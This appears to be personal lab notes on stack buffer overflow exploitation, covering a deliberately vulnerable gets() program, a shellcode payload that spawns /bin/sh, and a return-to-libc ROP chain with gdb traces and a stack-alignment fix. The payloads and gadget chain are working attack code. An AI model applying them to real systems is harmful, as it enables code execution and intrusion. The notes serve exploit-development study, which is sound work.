# &#35; basic stack buffer overflow

#### &#42; setting aslr off & core dump
```bash

$ cat /etc/sysctl.conf
kernel.randomize_va_space=0
kernel.core_pattern = core.%e


$ sudo sysctl -p
kernel.randomize_va_space = 0
kernel.core_pattern = core.%e

```

#### &#42; vulnerable source code
#### strcpy() in vuln_func() : can overwrite rsp & rip ...
```bash

$ cat vulnerable.c
#include <stdio.h>

void vuln_func() {
	char buffer[256];
	gets(&buffer);
	printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
	vuln_func();
}

# Canary/SSP & NX off because of first exploit
$ gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable

# previous success
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\xd8\xe2\xff\xff\xff\x7f"' > payload
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����
id
uid=1000(user) gid=1000(user) groups=1000(user)


------------------------------------------------------------


$ cat vulnerable.c
#include <stdio.h>

void vuln_func() {
	char buffer[256];
	gets(&buffer);
	printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
	vuln_func();
}

# Only Canary/SSP off because of newbie exploit
$ gcc -fno-stack-protector  vulnerable.c -o vulnerable
$ checksec --file=./vulnerable
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   67) Symbols	  No	0		1		./vulnerable

$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\xd8\xe2\xff\xff\xff\x7f"' > payload
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����

segmentation fault (core dumped)


$ gdb -core core.vulnerable -q
[*] 3 commands could not be loaded, run `gef missing` to know why.
[New LWP 2462]
Core was generated by `./vulnerable'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007fffffffe2d8 in ?? ()
gef➤  x/50xg $rsp-280
0x7fffffffe288:	0x000055555555519b	0x9090909090909090
0x7fffffffe298:	0x9090909090909090	0x9090909090909090
0x7fffffffe2a8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2b8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2c8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2d8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2e8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2f8:	0x9090909090909090	0x9090909090909090
0x7fffffffe308:	0x9090909090909090	0x9090909090909090
0x7fffffffe318:	0x9090909090909090	0x9090909090909090
0x7fffffffe328:	0x9090909090909090	0x9090909090909090
0x7fffffffe338:	0x9090909090909090	0x2fbf4856f6314890
0x7fffffffe348:	0x5768732f2f6e6962	0x050f99583b6a5f54
0x7fffffffe358:	0x9090909090909090	0x9090909090909090
0x7fffffffe368:	0x9090909090909090	0x9090909090909090
0x7fffffffe378:	0x9090909090909090	0x9090909090909090
0x7fffffffe388:	0x9090909090909090	0x4242424242424242
0x7fffffffe398:	0x00007fffffffe2d8	0x00007fffffffe4a8
0x7fffffffe3a8:	0x0000000100000000	0x0000000000000000
0x7fffffffe3b8:	0x00007ffff7de60b3	0x00007ffff7ffc620
0x7fffffffe3c8:	0x00007fffffffe4a8	0x0000000100000000
0x7fffffffe3d8:	0x000055555555519e	0x00005555555551c0
0x7fffffffe3e8:	0x4019c79755b63c03	0x0000555555555080
0x7fffffffe3f8:	0x00007fffffffe4a0	0x0000000000000000
0x7fffffffe408:	0x0000000000000000	0xbfe6386892363c03
gef➤  quit

# but 0x7fffffffe2d8 is exactly nops address...

------------------------------------------------------------
$ gdb ./vulnerable -q
gef➤  b *main
gef➤  r
gef➤  vmmap
.
.
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

# It haven't execute(x) permission on the stack, then nops and shellcode is failed.
# Thus we have other way.


```

#### &#42; need to find executable(x) area in libc
```bash
## libc-2.31.so (0x00007ffff7de4000~0x00007ffff7f5c000) area has execute permission.
## and we know libc_base_address is 0x00007ffff7dbf000.

$ gdb ./vulnerable -q
gef➤  b *main
Breakpoint 1 at 0x119e
gef➤  r
.
.
gef➤  vmmap
0x00007ffff7dbf000 0x00007ffff7de4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de4000 0x00007ffff7f5c000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5c000 0x00007ffff7fa6000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa6000 0x00007ffff7fa7000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
.
.
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

## thus we need to find /bin/sh string and system() in libc-2.31.so.

```

#### &#42; need to find system("/bin/sh") gadget and function address
```bash
## here is system()
gef➤  p system
$1 = {int (const char *)} 0x7ffff7e14410 <__libc_system>
gef➤  x/4i 0x7ffff7e14410
   0x7ffff7e14410 <__libc_system>:	endbr64
   0x7ffff7e14414 <__libc_system+4>:	test   rdi,rdi
   0x7ffff7e14417 <__libc_system+7>:	je     0x7ffff7e14420 <__libc_system+16>
   0x7ffff7e14419 <__libc_system+9>:	jmp    0x7ffff7e13e50 <do_system>
gef➤

## here is /bin/sh string
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5c000-0x7ffff7fa6000), permission=r--
  0x7ffff7f765aa - 0x7ffff7f765b1  →   "/bin/sh"
gef➤  x/s 0x7ffff7f765aa
0x7ffff7f765aa:	"/bin/sh"
gef➤  


## here is "pop rdi ; ret (libc_base + 0x0000000000026b72)"
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
0x0000000000026b72 : pop rdi ; ret
0x000000000002a56f : pop rdi ; retf 0x18
```


#### &#42; assemble rtl(return to libc) system("/bin/sh")
```bash
## payload struct
padding[256]
rbp[8]
pop rdi ; ret[8]
/bin/sh[8]
system()[8]

$ cat exp.py
payload  = "A"*256
payload += "B"*8
payload += "\x72\x5b\xde\xf7\xff\x7f\x00\x00"  #0x7ffff7de5b72 : pop rdi ; ret
payload += "\xaa\x65\xf7\xf7\xff\x7f\x00\x00"  #0x7ffff7f765aa /bin/sh
payload += "\x10\x44\xe1\xf7\xff\x7f\x00\x00"  #0x7ffff7e14410 system()
payload += "\xc0\x8b\xe0\xf7\xff\x7f\x00\x00"  # 0x7ffff7e08bc0 exit()

print(payload)

```

#### &#42; try to exploit
```bash
(cat payload ; cat) | ./vulnerable
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBr[���

segmentation fault (core dumped)

```


#### &#42; analysis using gdb(gef)
```bash
## Woops, it occcurs core dumped.
## find out using gdb

$ gdb ./vulnerable -q
gef➤  b *vuln_func
Breakpoint 1 at 0x1169
gef➤  r < payload
gef➤  ni
.
.
.

## pop rdi ; ret is exactly there.
gef➤  ni
0x000055555555519d in vuln_func ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x10f
$rbx   : 0x00005555555551c0  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7ed01e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffe358  →  0x00007ffff7de5b72  →  <init_cacheinfo+242> pop rdi
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x000055555555a2b0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00007ffff7fad4c0  →  0x0000000000000000
$rip   : 0x000055555555519d  →  <vuln_func+52> ret
$r8    : 0x10f
$r9    : 0x7c
$r10   : 0x00007ffff7faabe0  →  0x000055555555a6b0  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x0000555555555080  →  <_start+0> endbr64
$r13   : 0x00007fffffffe460  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe358│+0x0000: 0x00007ffff7de5b72  →  <init_cacheinfo+242> pop rdi	 ← $rsp
0x00007fffffffe360│+0x0008: 0x00007ffff7f765aa  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007fffffffe368│+0x0010: 0x00007ffff7e14410  →  <system+0> endbr64
0x00007fffffffe370│+0x0018: 0x0000000000000000
0x00007fffffffe378│+0x0020: 0x00007ffff7de60b3  →  <__libc_start_main+243> mov edi, eax
0x00007fffffffe380│+0x0028: 0x00007ffff7ffc620  →  0x00050b1600000000
0x00007fffffffe388│+0x0030: 0x00007fffffffe468  →  0x00007fffffffe6cd  →  "/home/user/aslr/nx-gets/vulnerable"
0x00007fffffffe390│+0x0038: 0x0000000100000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555196 <vuln_func+45>   call   0x555555555060 <puts@plt>
   0x55555555519b <vuln_func+50>   nop
   0x55555555519c <vuln_func+51>   leave
 → 0x55555555519d <vuln_func+52>   ret
   ↳  0x7ffff7de5b72 <init_cacheinfo+242> pop    rdi
      0x7ffff7de5b73 <init_cacheinfo+243> ret
      0x7ffff7de5b74 <init_cacheinfo+244> xor    edi, edi
      0x7ffff7de5b76 <init_cacheinfo+246> test   r14, r14
      0x7ffff7de5b79 <init_cacheinfo+249> jne    0x7ffff7de5b07 <init_cacheinfo+135>
      0x7ffff7de5b7b <init_cacheinfo+251> jmp    0x7ffff7de5b3a <init_cacheinfo+186>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vulnerable", stopped 0x55555555519d in vuln_func (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555519d → vuln_func()
[#1] 0x7ffff7de5b72 → init_cacheinfo()
[#2] 0x7ffff7e14410 → endbr64
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤


## system("/bin/sh") is exactly there too.
## but, it occurs segmentation fault (core dumped).
## going using continue.
gef➤ ni
__libc_system (line=0x7ffff7f765aa "/bin/sh") at ../sysdeps/posix/system.c:198
warning: Source file is more recent than executable.
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x10f
$rbx   : 0x00005555555551c0  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7ed01e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffe370  →  0x0000000000000000
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x000055555555a2b0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00007ffff7f765aa  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x00007ffff7e14410  →  <system+0> endbr64
$r8    : 0x10f
$r9    : 0x7c
$r10   : 0x00007ffff7faabe0  →  0x000055555555a6b0  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x0000555555555080  →  <_start+0> endbr64
$r13   : 0x00007fffffffe460  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe370│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe378│+0x0008: 0x00007ffff7de60b3  →  <__libc_start_main+243> mov edi, eax
0x00007fffffffe380│+0x0010: 0x00007ffff7ffc620  →  0x00050b1600000000
0x00007fffffffe388│+0x0018: 0x00007fffffffe468  →  0x00007fffffffe6cd  →  "/home/user/aslr/nx-gets/vulnerable"
0x00007fffffffe390│+0x0020: 0x0000000100000000
0x00007fffffffe398│+0x0028: 0x000055555555519e  →  <main+0> endbr64
0x00007fffffffe3a0│+0x0030: 0x00005555555551c0  →  <__libc_csu_init+0> endbr64
0x00007fffffffe3a8│+0x0038: 0x0cc08cff38177fd4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e14400 <cancel_handler+368> jmp    0x7ffff7e14368 <cancel_handler+216>
   0x7ffff7e14405 <cancel_handler+373> call   0x7ffff7ef1b00 <__stack_chk_fail>
   0x7ffff7e1440a                  nop    WORD PTR [rax+rax*1+0x0]
 → 0x7ffff7e14410 <system+0>       endbr64
   0x7ffff7e14414 <system+4>       test   rdi, rdi
   0x7ffff7e14417 <system+7>       je     0x7ffff7e14420 <__libc_system+16>
   0x7ffff7e14419 <system+9>       jmp    0x7ffff7e13e50 <do_system>
   0x7ffff7e1441e <system+14>      xchg   ax, ax
   0x7ffff7e14420 <system+16>      sub    rsp, 0x8
──────────────────────────────────────────────────────────────────────────────────────────────────────── source:../sysdeps/posi[...].c+198 ────
[!] Command 'context' failed to execute properly, reason: list index out of range
gef➤


## we can see below assembly line
## movaps XMMWORD PTR [rsp+0x50], xmm0 (meet SIGSEGV)
## and
## below error message
## Command 'context' failed to execute properly, reason: list index out of range


gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e13fbc in do_system (line=0x7ffff7f765aa "/bin/sh") at ../sysdeps/posix/system.c:148
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffff7fae2e0  →  0x00007fffffffe478  →  0x00007fffffffe6f0  →  "SHELL=/bin/bash"
$rbx   : 0x00007ffff7f765aa  →  0x0068732f6e69622f ("/bin/sh"?)
$rcx   : 0x00007fffffffe1e8  →  0x000000000000000c
$rdx   : 0x0
$rsp   : 0x00007fffffffdfd8  →  0x00007ffff7e5a913  →  <_int_malloc+3363> mov r8, rax
$rbp   : 0x00007fffffffe1e8  →  0x000000000000000c
$rsi   : 0x00007ffff7f765aa  →  0x0068732f6e69622f ("/bin/sh"?)
$rdi   : 0x00007fffffffdfe4  →  0x0000000000000000
$rip   : 0x00007ffff7e13fbc  →  <do_system+364> movaps XMMWORD PTR [rsp+0x50], xmm0
$r8    : 0x00007fffffffe028  →  0x0000003a00000029 (")"?)
$r9    : 0x00007fffffffe478  →  0x00007fffffffe6f0  →  "SHELL=/bin/bash"
$r10   : 0x8
$r11   : 0x246
$r12   : 0x00007fffffffe048  →  0x0000000000000000
$r13   : 0x00007fffffffe0c8  →  0x0000000000000006
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfd8│+0x0000: 0x00007ffff7e5a913  →  <_int_malloc+3363> mov r8, rax	 ← $rsp
0x00007fffffffdfe0│+0x0008: 0x00000000ffffffff
0x00007fffffffdfe8│+0x0010: 0x0000000000000000
0x00007fffffffdff0│+0x0018: 0x0000000000000000
0x00007fffffffdff8│+0x0020: 0x0000000000000410
0x00007fffffffe000│+0x0028: 0x0000000000000280
0x00007fffffffe008│+0x0030: 0x0000000000000029 (")"?)
0x00007fffffffe010│+0x0038: 0x0000000000000400
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e13fad <do_system+349>  mov    QWORD PTR [rsp+0x60], rbx
   0x7ffff7e13fb2 <do_system+354>  mov    r9, QWORD PTR [rax]
   0x7ffff7e13fb5 <do_system+357>  lea    rsi, [rip+0x1625ee]        # 0x7ffff7f765aa
 → 0x7ffff7e13fbc <do_system+364>  movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7ffff7e13fc1 <do_system+369>  mov    QWORD PTR [rsp+0x68], 0x0
   0x7ffff7e13fca <do_system+378>  call   0x7ffff7ece910 <__GI___posix_spawn>
   0x7ffff7e13fcf <do_system+383>  mov    rdi, rbp
   0x7ffff7e13fd2 <do_system+386>  mov    ebx, eax
   0x7ffff7e13fd4 <do_system+388>  call   0x7ffff7ece810 <__posix_spawnattr_destroy>
──────────────────────────────────────────────────────────────────────────────────────────────────────── source:../sysdeps/posi[...].c+148 ────
[!] Command 'context' failed to execute properly, reason: list index out of range
gef➤

```



#### &#42; About stack alignment.
#### link : <http://blog.binpang.me/2019/07/12/stack-alignment/>
```bash
## we need to modify out rtl payload to 16 bytes alignment.
## payload struct
padding[256]
rbp[8]
ret[8]
pop rdi ; ret[8]
/bin/sh[8]
system()[8]

$ cat exp.py
payload  = "A"*256
payload += "B"*8
payload += "\x73\x5b\xde\xf7\xff\x7f\x00\x00"  #0x7ffff7de5b73 : ret
payload += "\x72\x5b\xde\xf7\xff\x7f\x00\x00"  #0x7ffff7de5b72 : pop rdi ; ret
payload += "\xaa\x65\xf7\xf7\xff\x7f\x00\x00"  #0x7ffff7f765aa /bin/sh
payload += "\x10\x44\xe1\xf7\xff\x7f\x00\x00"  #0x7ffff7e14410 system()
payload += "\xc0\x8b\xe0\xf7\xff\x7f\x00\x00"  # 0x7ffff7e08bc0 exit()

print(payload)

```


#### &#42; try to exploit again
user@pwn:~/aslr/nx-gets$ python exp.py > payload
user@pwn:~/aslr/nx-gets$ (cat payload ; cat) | ./vulnerable
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBs[���

id
uid=1000(user) gid=1000(user) groups=1000(user)

```

